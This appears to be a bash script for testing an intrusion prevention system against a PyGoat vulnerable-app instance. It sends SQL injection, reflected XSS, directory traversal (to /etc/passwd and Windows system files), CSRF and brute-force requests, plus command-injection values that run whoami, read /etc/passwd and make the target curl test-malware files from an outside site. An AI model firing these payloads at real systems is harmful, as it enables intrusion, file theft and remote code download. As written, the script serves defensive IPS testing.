#!/bin/bash

# Define the correct base URL for PyGoat
BASE_URL="http://labs.aflabs.us:81"
MALWARE_URL_1="http://malware.wicar.org/data/eicar.com"
MALWARE_URL_2="http://malware.wicar.org/data/ms09_072_style_object.html"

echo "Testing IPS with various attacks on PyGoat..."

#########################
# SQL Injection Tests (5 Tests)
#########################

echo "Running SQL Injection Tests..."

SQLI_URL="${BASE_URL}/SQLInjection/login"

curl -i -s -k "${SQLI_URL}?username=admin%27+OR+%271%27=%271&password=anything&login=Login"
curl -i -s -k "${SQLI_URL}?username=admin%27+UNION+SELECT+null,null,null--&password=anything&login=Login"
curl -i -s -k "${SQLI_URL}?username=admin%27+AND+1=1--&password=anything&login=Login"
curl -i -s -k "${SQLI_URL}?username=admin%27--&password=anything&login=Login"
curl -i -s -k "${SQLI_URL}?username=admin%27+AND+%27x%27=%27x&password=anything&login=Login"

#########################
# Command Injection Tests (5 Tests)
#########################

echo "Running Command Injection Tests..."

CMD_INJ_URL="${BASE_URL}/CommandInjection/cmdexec"

curl -i -s -k "${CMD_INJ_URL}?target=127.0.0.1%3Bls&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?target=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?target=127.0.0.1%3Bwhoami&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?target=127.0.0.1%3Bcurl+-O+${MALWARE_URL_1}&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?target=127.0.0.1%3Bcurl+-O+${MALWARE_URL_2}&submit=Submit"

#########################
# Cross-Site Scripting (XSS) Tests (5 Tests)
#########################

echo "Running XSS Tests..."

XSS_URL="${BASE_URL}/XSS/reflective"

curl -i -s -k "${XSS_URL}?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
curl -i -s -k "${XSS_URL}?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Ciframe+src%3Djavascript%3Aalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E"

#########################
# Directory Traversal Tests (5 Tests)
#########################

echo "Running Directory Traversal Tests..."

DIR_TRAV_URL="${BASE_URL}/DirectoryTraversal/traverse"

curl -i -s -k "${DIR_TRAV_URL}?filename=../../../../etc/passwd"
curl -i -s -k "${DIR_TRAV_URL}?filename=../../../../etc/hosts"
curl -i -s -k "${DIR_TRAV_URL}?filename=../../../../proc/cpuinfo"
curl -i -s -k "${DIR_TRAV_URL}?filename=../../../../boot.ini"
curl -i -s -k "${DIR_TRAV_URL}?filename=../../../../windows/system32/config/system"

#########################
# CSRF Tests (5 Tests)
#########################

echo "Running CSRF Tests..."

CSRF_URL="${BASE_URL}/CSRF/csrf"

curl -i -s -k -X POST "${CSRF_URL}" -d "username=admin&password=password"
curl -i -s -k -X POST "${CSRF_URL}" -d "username=admin&newpassword=HackedPassword"
curl -i -s -k -X POST "${CSRF_URL}" -d "action=post&title=Hacked&body=<script>alert('csrf')</script>"
curl -i -s -k "${BASE_URL}/CSRF/logout"
curl -i -s -k -X POST "${CSRF_URL}" -H "Referer: "

#########################
# Malware Injection Simulation (2 Tests)
#########################

echo "Running Malware Injection Simulations..."

curl -i -s -k "${BASE_URL}/MalwareInjection?file=${MALWARE_URL_1}"
curl -i -s -k "${BASE_URL}/MalwareInjection?file=${MALWARE_URL_2}"

#########################
# Brute Force Tests (5 Tests)
#########################

echo "Running Brute Force Tests..."

BRUTE_FORCE_URL="${BASE_URL}/BruteForce/login"

for i in {1..5}; do
  curl -i -s -k "${BRUTE_FORCE_URL}?username=admin&password=wrongpass${i}&login=Login"
done

echo "IPS testing completed."
